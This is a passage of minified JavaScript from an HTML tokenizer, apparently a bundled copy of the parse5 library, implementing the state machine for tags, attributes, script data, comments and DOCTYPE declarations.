V.COMMENT_LESS_THAN_SIGN_BANG_DASH:{this._stateCommentLessThanSignBangDash(t);break}case V.COMMENT_LESS_THAN_SIGN_BANG_DASH_DASH:{this._stateCommentLessThanSignBangDashDash(t);break}case V.COMMENT_END_DASH:{this._stateCommentEndDash(t);break}case V.COMMENT_END:{this._stateCommentEnd(t);break}case V.COMMENT_END_BANG:{this._stateCommentEndBang(t);break}case V.DOCTYPE:{this._stateDoctype(t);break}case V.BEFORE_DOCTYPE_NAME:{this._stateBeforeDoctypeName(t);break}case V.DOCTYPE_NAME:{this._stateDoctypeName(t);break}case V.AFTER_DOCTYPE_NAME:{this._stateAfterDoctypeName(t);break}case V.AFTER_DOCTYPE_PUBLIC_KEYWORD:{this._stateAfterDoctypePublicKeyword(t);break}case V.BEFORE_DOCTYPE_PUBLIC_IDENTIFIER:{this._stateBeforeDoctypePublicIdentifier(t);break}case V.DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED:{this._stateDoctypePublicIdentifierDoubleQuoted(t);break}case V.DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED:{this._stateDoctypePublicIdentifierSingleQuoted(t);break}case V.AFTER_DOCTYPE_PUBLIC_IDENTIFIER:{this._stateAfterDoctypePublicIdentifier(t);break}case V.BETWEEN_DOCTYPE_PUBLIC_AND_SYSTEM_IDENTIFIERS:{this._stateBetweenDoctypePublicAndSystemIdentifiers(t);break}case V.AFTER_DOCTYPE_SYSTEM_KEYWORD:{this._stateAfterDoctypeSystemKeyword(t);break}case V.BEFORE_DOCTYPE_SYSTEM_IDENTIFIER:{this._stateBeforeDoctypeSystemIdentifier(t);break}case V.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED:{this._stateDoctypeSystemIdentifierDoubleQuoted(t);break}case V.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED:{this._stateDoctypeSystemIdentifierSingleQuoted(t);break}case V.AFTER_DOCTYPE_SYSTEM_IDENTIFIER:{this._stateAfterDoctypeSystemIdentifier(t);break}case V.BOGUS_DOCTYPE:{this._stateBogusDoctype(t);break}case V.CDATA_SECTION:{this._stateCdataSection(t);break}case V.CDATA_SECTION_BRACKET:{this._stateCdataSectionBracket(t);break}case V.CDATA_SECTION_END:{this._stateCdataSectionEnd(t);break}case V.CHARACTER_REFERENCE:{this._stateCharacterReference();break}case V.AMBIGUOUS_AMPERSAND:{this._stateAmbiguousAmpersand(t);break}default:throw new Error("Unknown state")}}_stateData(t){switch(t){case z.LESS_THAN_SIGN:{this.state=V.TAG_OPEN;break}case z.AMPERSAND:{this._startCharacterReference();break}case z.NULL:{this._err(he.unexpectedNullCharacter),this._emitCodePoint(t);break}case z.EOF:{this._emitEOFToken();break}default:this._emitCodePoint(t)}}_stateRcdata(t){switch(t){case z.AMPERSAND:{this._startCharacterReference();break}case z.LESS_THAN_SIGN:{this.state=V.RCDATA_LESS_THAN_SIGN;break}case z.NULL:{this._err(he.unexpectedNullCharacter),this._emitChars(Ut);break}case z.EOF:{this._emitEOFToken();break}default:this._emitCodePoint(t)}}_stateRawtext(t){switch(t){case z.LESS_THAN_SIGN:{this.state=V.RAWTEXT_LESS_THAN_SIGN;break}case z.NULL:{this._err(he.unexpectedNullCharacter),this._emitChars(Ut);break}case z.EOF:{this._emitEOFToken();break}default:this._emitCodePoint(t)}}_stateScriptData(t){switch(t){case z.LESS_THAN_SIGN:{this.state=V.SCRIPT_DATA_LESS_THAN_SIGN;break}case z.NULL:{this._err(he.unexpectedNullCharacter),this._emitChars(Ut);break}case z.EOF:{this._emitEOFToken();break}default:this._emitCodePoint(t)}}_statePlaintext(t){switch(t){case z.NULL:{this._err(he.unexpectedNullCharacter),this._emitChars(Ut);break}case z.EOF:{this._emitEOFToken();break}default:this._emitCodePoint(t)}}_stateTagOpen(t){if(la(t))this._createStartTagToken(),this.state=V.TAG_NAME,this._stateTagName(t);else switch(t){case z.EXCLAMATION_MARK:{this.state=V.MARKUP_DECLARATION_OPEN;break}case z.SOLIDUS:{this.state=V.END_TAG_OPEN;break}case z.QUESTION_MARK:{this._err(he.unexpectedQuestionMarkInsteadOfTagName),this._createCommentToken(1),this.state=V.BOGUS_COMMENT,this._stateBogusComment(t);break}case z.EOF:{this._err(he.eofBeforeTagName),this._emitChars("<"),this._emitEOFToken();break}default:this._err(he.invalidFirstCharacterOfTagName),this._emitChars("<"),this.state=V.DATA,this._stateData(t)}}_stateEndTagOpen(t){if(la(t))this._createEndTagToken(),this.state=V.TAG_NAME,this._stateTagName(t);else switch(t){case z.GREATER_THAN_SIGN:{this._err(he.missingEndTagName),this.state=V.DATA;break}case z.EOF:{this._err(he.eofBeforeTagName),this._emitChars("</"),this._emitEOFToken();break}default:this._err(he.invalidFirstCharacterOfTagName),this._createCommentToken(2),this.state=V.BOGUS_COMMENT,this._stateBogusComment(t)}}_stateTagName(t){const n=this.currentToken;switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:{this.state=V.BEFORE_ATTRIBUTE_NAME;break}case z.SOLIDUS:{this.state=V.SELF_CLOSING_START_TAG;break}case z.GREATER_THAN_SIGN:{this.state=V.DATA,this.emitCurrentTagToken();break}case z.NULL:{this._err(he.unexpectedNullCharacter),n.tagName+=Ut;break}case z.EOF:{this._err(he.eofInTag),this._emitEOFToken();break}default:n.tagName+=String.fromCodePoint(Yo(t)?fd(t):t)}}_stateRcdataLessThanSign(t){t===z.SOLIDUS?this.state=V.RCDATA_END_TAG_OPEN:(this._emitChars("<"),this.state=V.RCDATA,this._stateRcdata(t))}_stateRcdataEndTagOpen(t){la(t)?(this.state=V.RCDATA_END_TAG_NAME,this._stateRcdataEndTagName(t)):(this._emitChars("</"),this.state=V.RCDATA,this._stateRcdata(t))}handleSpecialEndTag(t){if(!this.preprocessor.startsWith(this.lastStartTagName,!1))return!this._ensureHibernation();this._createEndTagToken();const n=this.currentToken;switch(n.tagName=this.lastStartTagName,this.preprocessor.peek(this.lastStartTagName.length)){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:return this._advanceBy(this.lastStartTagName.length),this.state=V.BEFORE_ATTRIBUTE_NAME,!1;case z.SOLIDUS:return this._advanceBy(this.lastStartTagName.length),this.state=V.SELF_CLOSING_START_TAG,!1;case z.GREATER_THAN_SIGN:return this._advanceBy(this.lastStartTagName.length),this.emitCurrentTagToken(),this.state=V.DATA,!1;default:return!this._ensureHibernation()}}_stateRcdataEndTagName(t){this.handleSpecialEndTag(t)&&(this._emitChars("</"),this.state=V.RCDATA,this._stateRcdata(t))}_stateRawtextLessThanSign(t){t===z.SOLIDUS?this.state=V.RAWTEXT_END_TAG_OPEN:(this._emitChars("<"),this.state=V.RAWTEXT,this._stateRawtext(t))}_stateRawtextEndTagOpen(t){la(t)?(this.state=V.RAWTEXT_END_TAG_NAME,this._stateRawtextEndTagName(t)):(this._emitChars("</"),this.state=V.RAWTEXT,this._stateRawtext(t))}_stateRawtextEndTagName(t){this.handleSpecialEndTag(t)&&(this._emitChars("</"),this.state=V.RAWTEXT,this._stateRawtext(t))}_stateScriptDataLessThanSign(t){switch(t){case z.SOLIDUS:{this.state=V.SCRIPT_DATA_END_TAG_OPEN;break}case z.EXCLAMATION_MARK:{this.state=V.SCRIPT_DATA_ESCAPE_START,this._emitChars("<!");break}default:this._emitChars("<"),this.state=V.SCRIPT_DATA,this._stateScriptData(t)}}_stateScriptDataEndTagOpen(t){la(t)?(this.state=V.SCRIPT_DATA_END_TAG_NAME,this._stateScriptDataEndTagName(t)):(this._emitChars("</"),this.state=V.SCRIPT_DATA,this._stateScriptData(t))}_stateScriptDataEndTagName(t){this.handleSpecialEndTag(t)&&(this._emitChars("</"),this.state=V.SCRIPT_DATA,this._stateScriptData(t))}_stateScriptDataEscapeStart(t){t===z.HYPHEN_MINUS?(this.state=V.SCRIPT_DATA_ESCAPE_START_DASH,this._emitChars("-")):(this.state=V.SCRIPT_DATA,this._stateScriptData(t))}_stateScriptDataEscapeStartDash(t){t===z.HYPHEN_MINUS?(this.state=V.SCRIPT_DATA_ESCAPED_DASH_DASH,this._emitChars("-")):(this.state=V.SCRIPT_DATA,this._stateScriptData(t))}_stateScriptDataEscaped(t){switch(t){case z.HYPHEN_MINUS:{this.state=V.SCRIPT_DATA_ESCAPED_DASH,this._emitChars("-");break}case z.LESS_THAN_SIGN:{this.state=V.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN;break}case z.NULL:{this._err(he.unexpectedNullCharacter),this._emitChars(Ut);break}case z.EOF:{this._err(he.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this._emitCodePoint(t)}}_stateScriptDataEscapedDash(t){switch(t){case z.HYPHEN_MINUS:{this.state=V.SCRIPT_DATA_ESCAPED_DASH_DASH,this._emitChars("-");break}case z.LESS_THAN_SIGN:{this.state=V.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN;break}case z.NULL:{this._err(he.unexpectedNullCharacter),this.state=V.SCRIPT_DATA_ESCAPED,this._emitChars(Ut);break}case z.EOF:{this._err(he.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this.state=V.SCRIPT_DATA_ESCAPED,this._emitCodePoint(t)}}_stateScriptDataEscapedDashDash(t){switch(t){case z.HYPHEN_MINUS:{this._emitChars("-");break}case z.LESS_THAN_SIGN:{this.state=V.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN;break}case z.GREATER_THAN_SIGN:{this.state=V.SCRIPT_DATA,this._emitChars(">");break}case z.NULL:{this._err(he.unexpectedNullCharacter),this.state=V.SCRIPT_DATA_ESCAPED,this._emitChars(Ut);break}case z.EOF:{this._err(he.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this.state=V.SCRIPT_DATA_ESCAPED,this._emitCodePoint(t)}}_stateScriptDataEscapedLessThanSign(t){t===z.SOLIDUS?this.state=V.SCRIPT_DATA_ESCAPED_END_TAG_OPEN:la(t)?(this._emitChars("<"),this.state=V.SCRIPT_DATA_DOUBLE_ESCAPE_START,this._stateScriptDataDoubleEscapeStart(t)):(this._emitChars("<"),this.state=V.SCRIPT_DATA_ESCAPED,this._stateScriptDataEscaped(t))}_stateScriptDataEscapedEndTagOpen(t){la(t)?(this.state=V.SCRIPT_DATA_ESCAPED_END_TAG_NAME,this._stateScriptDataEscapedEndTagName(t)):(this._emitChars("</"),this.state=V.SCRIPT_DATA_ESCAPED,this._stateScriptDataEscaped(t))}_stateScriptDataEscapedEndTagName(t){this.handleSpecialEndTag(t)&&(this._emitChars("</"),this.state=V.SCRIPT_DATA_ESCAPED,this._stateScriptDataEscaped(t))}_stateScriptDataDoubleEscapeStart(t){if(this.preprocessor.startsWith(rr.SCRIPT,!1)&&f2(this.preprocessor.peek(rr.SCRIPT.length))){this._emitCodePoint(t);for(let n=0;n<rr.SCRIPT.length;n++)this._emitCodePoint(this._consume());this.state=V.SCRIPT_DATA_DOUBLE_ESCAPED}else this._ensureHibernation()||(this.state=V.SCRIPT_DATA_ESCAPED,this._stateScriptDataEscaped(t))}_stateScriptDataDoubleEscaped(t){switch(t){case z.HYPHEN_MINUS:{this.state=V.SCRIPT_DATA_DOUBLE_ESCAPED_DASH,this._emitChars("-");break}case z.LESS_THAN_SIGN:{this.state=V.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN,this._emitChars("<");break}case z.NULL:{this._err(he.unexpectedNullCharacter),this._emitChars(Ut);break}case z.EOF:{this._err(he.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this._emitCodePoint(t)}}_stateScriptDataDoubleEscapedDash(t){switch(t){case z.HYPHEN_MINUS:{this.state=V.SCRIPT_DATA_DOUBLE_ESCAPED_DASH_DASH,this._emitChars("-");break}case z.LESS_THAN_SIGN:{this.state=V.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN,this._emitChars("<");break}case z.NULL:{this._err(he.unexpectedNullCharacter),this.state=V.SCRIPT_DATA_DOUBLE_ESCAPED,this._emitChars(Ut);break}case z.EOF:{this._err(he.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this.state=V.SCRIPT_DATA_DOUBLE_ESCAPED,this._emitCodePoint(t)}}_stateScriptDataDoubleEscapedDashDash(t){switch(t){case z.HYPHEN_MINUS:{this._emitChars("-");break}case z.LESS_THAN_SIGN:{this.state=V.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN,this._emitChars("<");break}case z.GREATER_THAN_SIGN:{this.state=V.SCRIPT_DATA,this._emitChars(">");break}case z.NULL:{this._err(he.unexpectedNullCharacter),this.state=V.SCRIPT_DATA_DOUBLE_ESCAPED,this._emitChars(Ut);break}case z.EOF:{this._err(he.eofInScriptHtmlCommentLikeText),this._emitEOFToken();break}default:this.state=V.SCRIPT_DATA_DOUBLE_ESCAPED,this._emitCodePoint(t)}}_stateScriptDataDoubleEscapedLessThanSign(t){t===z.SOLIDUS?(this.state=V.SCRIPT_DATA_DOUBLE_ESCAPE_END,this._emitChars("/")):(this.state=V.SCRIPT_DATA_DOUBLE_ESCAPED,this._stateScriptDataDoubleEscaped(t))}_stateScriptDataDoubleEscapeEnd(t){if(this.preprocessor.startsWith(rr.SCRIPT,!1)&&f2(this.preprocessor.peek(rr.SCRIPT.length))){this._emitCodePoint(t);for(let n=0;n<rr.SCRIPT.length;n++)this._emitCodePoint(this._consume());this.state=V.SCRIPT_DATA_ESCAPED}else this._ensureHibernation()||(this.state=V.SCRIPT_DATA_DOUBLE_ESCAPED,this._stateScriptDataDoubleEscaped(t))}_stateBeforeAttributeName(t){switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.SOLIDUS:case z.GREATER_THAN_SIGN:case z.EOF:{this.state=V.AFTER_ATTRIBUTE_NAME,this._stateAfterAttributeName(t);break}case z.EQUALS_SIGN:{this._err(he.unexpectedEqualsSignBeforeAttributeName),this._createAttr("="),this.state=V.ATTRIBUTE_NAME;break}default:this._createAttr(""),this.state=V.ATTRIBUTE_NAME,this._stateAttributeName(t)}}_stateAttributeName(t){switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:case z.SOLIDUS:case z.GREATER_THAN_SIGN:case z.EOF:{this._leaveAttrName(),this.state=V.AFTER_ATTRIBUTE_NAME,this._stateAfterAttributeName(t);break}case z.EQUALS_SIGN:{this._leaveAttrName(),this.state=V.BEFORE_ATTRIBUTE_VALUE;break}case z.QUOTATION_MARK:case z.APOSTROPHE:case z.LESS_THAN_SIGN:{this._err(he.unexpectedCharacterInAttributeName),this.currentAttr.name+=String.fromCodePoint(t);break}case z.NULL:{this._err(he.unexpectedNullCharacter),this.currentAttr.name+=Ut;break}default:this.currentAttr.name+=String.fromCodePoint(Yo(t)?fd(t):t)}}_stateAfterAttributeName(t){switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.SOLIDUS:{this.state=V.SELF_CLOSING_START_TAG;break}case z.EQUALS_SIGN:{this.state=V.BEFORE_ATTRIBUTE_VALUE;break}case z.GREATER_THAN_SIGN:{this.state=V.DATA,this.emitCurrentTagToken();break}case z.EOF:{this._err(he.eofInTag),this._emitEOFToken();break}default:this._createAttr(""),this.state=V.ATTRIBUTE_NAME,this._stateAttributeName(t)}}_stateBeforeAttributeValue(t){switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.QUOTATION_MARK:{this.state=V.ATTRIBUTE_VALUE_DOUBLE_QUOTED;break}case z.APOSTROPHE:{this.state=V.ATTRIBUTE_VALUE_SINGLE_QUOTED;break}case z.GREATER_THAN_SIGN:{this._err(he.missingAttributeValue),this.state=V.DATA,this.emitCurrentTagToken();break}default:this.state=V.ATTRIBUTE_VALUE_UNQUOTED,this._stateAttributeValueUnquoted(t)}}_stateAttributeValueDoubleQuoted(t){switch(t){case z.QUOTATION_MARK:{this.state=V.AFTER_ATTRIBUTE_VALUE_QUOTED;break}case z.AMPERSAND:{this._startCharacterReference();break}case z.NULL:{this._err(he.unexpectedNullCharacter),this.currentAttr.value+=Ut;break}case z.EOF:{this._err(he.eofInTag),this._emitEOFToken();break}default:this.currentAttr.value+=String.fromCodePoint(t)}}_stateAttributeValueSingleQuoted(t){switch(t){case z.APOSTROPHE:{this.state=V.AFTER_ATTRIBUTE_VALUE_QUOTED;break}case z.AMPERSAND:{this._startCharacterReference();break}case z.NULL:{this._err(he.unexpectedNullCharacter),this.currentAttr.value+=Ut;break}case z.EOF:{this._err(he.eofInTag),this._emitEOFToken();break}default:this.currentAttr.value+=String.fromCodePoint(t)}}_stateAttributeValueUnquoted(t){switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:{this._leaveAttrValue(),this.state=V.BEFORE_ATTRIBUTE_NAME;break}case z.AMPERSAND:{this._startCharacterReference();break}case z.GREATER_THAN_SIGN:{this._leaveAttrValue(),this.state=V.DATA,this.emitCurrentTagToken();break}case z.NULL:{this._err(he.unexpectedNullCharacter),this.currentAttr.value+=Ut;break}case z.QUOTATION_MARK:case z.APOSTROPHE:case z.LESS_THAN_SIGN:case z.EQUALS_SIGN:case z.GRAVE_ACCENT:{this._err(he.unexpectedCharacterInUnquotedAttributeValue),this.currentAttr.value+=String.fromCodePoint(t);break}case z.EOF:{this._err(he.eofInTag),this._emitEOFToken();break}default:this.currentAttr.value+=String.fromCodePoint(t)}}_stateAfterAttributeValueQuoted(t){switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:{this._leaveAttrValue(),this.state=V.BEFORE_ATTRIBUTE_NAME;break}case z.SOLIDUS:{this._leaveAttrValue(),this.state=V.SELF_CLOSING_START_TAG;break}case z.GREATER_THAN_SIGN:{this._leaveAttrValue(),this.state=V.DATA,this.emitCurrentTagToken();break}case z.EOF:{this._err(he.eofInTag),this._emitEOFToken();break}default:this._err(he.missingWhitespaceBetweenAttributes),this.state=V.BEFORE_ATTRIBUTE_NAME,this._stateBeforeAttributeName(t)}}_stateSelfClosingStartTag(t){switch(t){case z.GREATER_THAN_SIGN:{const n=this.currentToken;n.selfClosing=!0,this.state=V.DATA,this.emitCurrentTagToken();break}case z.EOF:{this._err(he.eofInTag),this._emitEOFToken();break}default:this._err(he.unexpectedSolidusInTag),this.state=V.BEFORE_ATTRIBUTE_NAME,this._stateBeforeAttributeName(t)}}_stateBogusComment(t){const n=this.currentToken;switch(t){case z.GREATER_THAN_SIGN:{this.state=V.DATA,this.emitCurrentComment(n);break}case z.EOF:{this.emitCurrentComment(n),this._emitEOFToken();break}case z.NULL:{this._err(he.unexpectedNullCharacter),n.data+=Ut;break}default:n.data+=String.fromCodePoint(t)}}_stateMarkupDeclarationOpen(t){this._consumeSequenceIfMatch(rr.DASH_DASH,!0)?(this._createCommentToken(rr.DASH_DASH.length+1),this.state=V.COMMENT_START):this._consumeSequenceIfMatch(rr.DOCTYPE,!1)?(this.currentLocation=this.getCurrentLocation(rr.DOCTYPE.length+1),this.state=V.DOCTYPE):this._consumeSequenceIfMatch(rr.CDATA_START,!0)?this.inForeignNode?this.state=V.CDATA_SECTION:(this._err(he.cdataInHtmlContent),this._createCommentToken(rr.CDATA_START.length+1),this.currentToken.data="[CDATA[",this.state=V.BOGUS_COMMENT):this._ensureHibernation()||(this._err(he.incorrectlyOpenedComment),this._createCommentToken(2),this.state=V.BOGUS_COMMENT,this._stateBogusComment(t))}_stateCommentStart(t){switch(t){case z.HYPHEN_MINUS:{this.state=V.COMMENT_START_DASH;break}case z.GREATER_THAN_SIGN:{this._err(he.abruptClosingOfEmptyComment),this.state=V.DATA;const n=this.currentToken;this.emitCurrentComment(n);break}default:this.state=V.COMMENT,this._stateComment(t)}}_stateCommentStartDash(t){const n=this.currentToken;switch(t){case z.HYPHEN_MINUS:{this.state=V.COMMENT_END;break}case z.GREATER_THAN_SIGN:{this._err(he.abruptClosingOfEmptyComment),this.state=V.DATA,this.emitCurrentComment(n);break}case z.EOF:{this._err(he.eofInComment),this.emitCurrentComment(n),this._emitEOFToken();break}default:n.data+="-",this.state=V.COMMENT,this._stateComment(t)}}_stateComment(t){const n=this.currentToken;switch(t){case z.HYPHEN_MINUS:{this.state=V.COMMENT_END_DASH;break}case z.LESS_THAN_SIGN:{n.data+="<",this.state=V.COMMENT_LESS_THAN_SIGN;break}case z.NULL:{this._err(he.unexpectedNullCharacter),n.data+=Ut;break}case z.EOF:{this._err(he.eofInComment),this.emitCurrentComment(n),this._emitEOFToken();break}default:n.data+=String.fromCodePoint(t)}}_stateCommentLessThanSign(t){const n=this.currentToken;switch(t){case z.EXCLAMATION_MARK:{n.data+="!",this.state=V.COMMENT_LESS_THAN_SIGN_BANG;break}case z.LESS_THAN_SIGN:{n.data+="<";break}default:this.state=V.COMMENT,this._stateComment(t)}}_stateCommentLessThanSignBang(t){t===z.HYPHEN_MINUS?this.state=V.COMMENT_LESS_THAN_SIGN_BANG_DASH:(this.state=V.COMMENT,this._stateComment(t))}_stateCommentLessThanSignBangDash(t){t===z.HYPHEN_MINUS?this.state=V.COMMENT_LESS_THAN_SIGN_BANG_DASH_DASH:(this.state=V.COMMENT_END_DASH,this._stateCommentEndDash(t))}_stateCommentLessThanSignBangDashDash(t){t!==z.GREATER_THAN_SIGN&&t!==z.EOF&&this._err(he.nestedComment),this.state=V.COMMENT_END,this._stateCommentEnd(t)}_stateCommentEndDash(t){const n=this.currentToken;switch(t){case z.HYPHEN_MINUS:{this.state=V.COMMENT_END;break}case z.EOF:{this._err(he.eofInComment),this.emitCurrentComment(n),this._emitEOFToken();break}default:n.data+="-",this.state=V.COMMENT,this._stateComment(t)}}_stateCommentEnd(t){const n=this.currentToken;switch(t){case z.GREATER_THAN_SIGN:{this.state=V.DATA,this.emitCurrentComment(n);break}case z.EXCLAMATION_MARK:{this.state=V.COMMENT_END_BANG;break}case z.HYPHEN_MINUS:{n.data+="-";break}case z.EOF:{this._err(he.eofInComment),this.emitCurrentComment(n),this._emitEOFToken();break}default:n.data+="--",this.state=V.COMMENT,this._stateComment(t)}}_stateCommentEndBang(t){const n=this.currentToken;switch(t){case z.HYPHEN_MINUS:{n.data+="--!",this.state=V.COMMENT_END_DASH;break}case z.GREATER_THAN_SIGN:{this._err(he.incorrectlyClosedComment),this.state=V.DATA,this.emitCurrentComment(n);break}case z.EOF:{this._err(he.eofInComment),this.emitCurrentComment(n),this._emitEOFToken();break}default:n.data+="--!",this.state=V.COMMENT,this._stateComment(t)}}_stateDoctype(t){switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:{this.state=V.BEFORE_DOCTYPE_NAME;break}case z.GREATER_THAN_SIGN:{this.state=V.BEFORE_DOCTYPE_NAME,this._stateBeforeDoctypeName(t);break}case z.EOF:{this._err(he.eofInDoctype),this._createDoctypeToken(null);const n=this.currentToken;n.forceQuirks=!0,this.emitCurrentDoctype(n),this._emitEOFToken();break}default:this._err(he.missingWhitespaceBeforeDoctypeName),this.state=V.BEFORE_DOCTYPE_NAME,this._stateBeforeDoctypeName(t)}}_stateBeforeDoctypeName(t){if(Yo(t))this._createDoctypeToken(String.fromCharCode(fd(t))),this.state=V.DOCTYPE_NAME;else switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.NULL:{this._err(he.unexpectedNullCharacter),this._createDoctypeToken(Ut),this.state=V.DOCTYPE_NAME;break}case z.GREATER_THAN_SIGN:{this._err(he.missingDoctypeName),this._createDoctypeToken(null);const n=this.currentToken;n.forceQuirks=!0,this.emitCurrentDoctype(n),this.state=V.DATA;break}case z.EOF:{this._err(he.eofInDoctype),this._createDoctypeToken(null);const n=this.currentToken;n.forceQuirks=!0,this.emitCurrentDoctype(n),this._emitEOFToken();break}default:this._createDoctypeToken(String.fromCodePoint(t)),this.state=V.DOCTYPE_NAME}}_stateDoctypeName(t){const n=this.currentToken;switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:{this.state=V.AFTER_DOCTYPE_NAME;break}case z.GREATER_THAN_SIGN:{this.state=V.DATA,this.emitCurrentDoctype(n);break}case z.NULL:{this._err(he.unexpectedNullCharacter),n.name+=Ut;break}case z.EOF:{this._err(he.eofInDoctype),n.forceQuirks=!0,this.emitCurrentDoctype(n),this._emitEOFToken();break}default:n.name+=String.fromCodePoint(Yo(t)?fd(t):t)}}_stateAfterDoctypeName(t){const n=this.currentToken;switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.GREATER_THAN_SIGN:{this.state=V.DATA,this.emitCurrentDoctype(n);break}case z.EOF:{this._err(he.eofInDoctype),n.forceQuirks=!0,this.emitCurrentDoctype(n),this._emitEOFToken();break}default:this._consumeSequenceIfMatch(rr.PUBLIC,!1)?this.state=V.AFTER_DOCTYPE_PUBLIC_KEYWORD:this._consumeSequenceIfMatch(rr.SYSTEM,!1)?this.state=V.AFTER_DOCTYPE_SYSTEM_KEYWORD:this._ensureHibernation()||(this._err(he.invalidCharacterSequenceAfterDoctypeName),n.forceQuirks=!0,this.state=V.BOGUS_DOCTYPE,this._stateBogusDoctype(t))}}_stateAfterDoctypePublicKeyword(t){const n=this.currentToken;switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:{this.state=V.BEFORE_DOCTYPE_PUBLIC_IDENTIFIER;break}case z.QUOTATION_MARK:{this._err(he.missingWhitespaceAfterDoctypePublicKeyword),n.publicId="",this.state=V.DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED;break}case z.APOSTROPHE:{this._err(he.missingWhitespaceAfterDoctypePublicKeyword),n.publicId="",this.state=V.DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED;break}case z.GREATER_THAN_SIGN:{this._err(he.missingDoctypePublicIdentifier),n.forceQuirks=!0,this.state=V.DATA,this.emitCurrentDoctype(n);break}case z.EOF:{this._err(he.eofInDoctype),n.forceQuirks=!0,this.emitCurrentDoctype(n),this._emitEOFToken();break}default:this._err(he.missingQuoteBeforeDoctypePublicIdentifier),n.forceQuirks=!0,this.state=V.BOGUS_DOCTYPE,this._stateBogusDoctype(t)}}_stateBeforeDoctypePublicIdentifier(t){const n=this.currentToken;switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.QUOTATION_MARK:{n.publicId="",this.state=V.DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED;break}case z.APOSTROPHE:{n.publicId="",this.state=V.DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED;break}case z.GREATER_THAN_SIGN:{this._err(he.missingDoctypePublicIdentifier),n.forceQuirks=!0,this.state=V.DATA,this.emitCurrentDoctype(n);break}case z.EOF:{this._err(he.eofInDoctype),n.forceQuirks=!0,this.emitCurrentDoctype(n),this._emitEOFToken();break}default:this._err(he.missingQuoteBeforeDoctypePublicIdentifier),n.forceQuirks=!0,this.state=V.BOGUS_DOCTYPE,this._stateBogusDoctype(t)}}_stateDoctypePublicIdentifierDoubleQuoted(t){const n=this.currentToken;switch(t){case z.QUOTATION_MARK:{this.state=V.AFTER_DOCTYPE_PUBLIC_IDENTIFIER;break}case z.NULL:{this._err(he.unexpectedNullCharacter),n.publicId+=Ut;break}case z.GREATER_THAN_SIGN:{this._err(he.abruptDoctypePublicIdentifier),n.forceQuirks=!0,this.emitCurrentDoctype(n),this.state=V.DATA;break}case z.EOF:{this._err(he.eofInDoctype),n.forceQuirks=!0,this.emitCurrentDoctype(n),this._emitEOFToken();break}default:n.publicId+=String.fromCodePoint(t)}}_stateDoctypePublicIdentifierSingleQuoted(t){const n=this.currentToken;switch(t){case z.APOSTROPHE:{this.state=V.AFTER_DOCTYPE_PUBLIC_IDENTIFIER;break}case z.NULL:{this._err(he.unexpectedNullCharacter),n.publicId+=Ut;break}case z.GREATER_THAN_SIGN:{this._err(he.abruptDoctypePublicIdentifier),n.forceQuirks=!0,this.emitCurrentDoctype(n),this.state=V.DATA;break}case z.EOF:{this._err(he.eofInDoctype),n.forceQuirks=!0,this.emitCurrentDoctype(n),this._emitEOFToken();break}default:n.publicId+=String.fromCodePoint(t)}}_stateAfterDoctypePublicIdentifier(t){const n=this.currentToken;switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:{this.state=V.BETWEEN_DOCTYPE_PUBLIC_AND_SYSTEM_IDENTIFIERS;break}case z.GREATER_THAN_SIGN:{this.state=V.DATA,this.emitCurrentDoctype(n);break}case z.QUOTATION_MARK:{this._err(he.missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers),n.systemId="",this.state=V.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED;break}case z.APOSTROPHE:{this._err(he.missingWhitespaceBetweenDoctypePublicAndSystemIdentifiers),n.systemId="",this.state=V.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED;break}case z.EOF:{this._err(he.eofInDoctype),n.forceQuirks=!0,this.emitCurrentDoctype(n),this._emitEOFToken();break}default:this._err(he.missingQuoteBeforeDoctypeSystemIdentifier),n.forceQuirks=!0,this.state=V.BOGUS_DOCTYPE,this._stateBogusDoctype(t)}}_stateBetweenDoctypePublicAndSystemIdentifiers(t){const n=this.currentToken;switch(t){case z.SPACE:case z.LINE_FEED:case z.TABULATION:case z.FORM_FEED:break;case z.GREATER_THAN_SIGN:{this.emitCurrentDoctype(n),this.state=V.DATA;break}case z.QUOTATION_MARK:{n.systemId="",this.state=V.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED;break}case 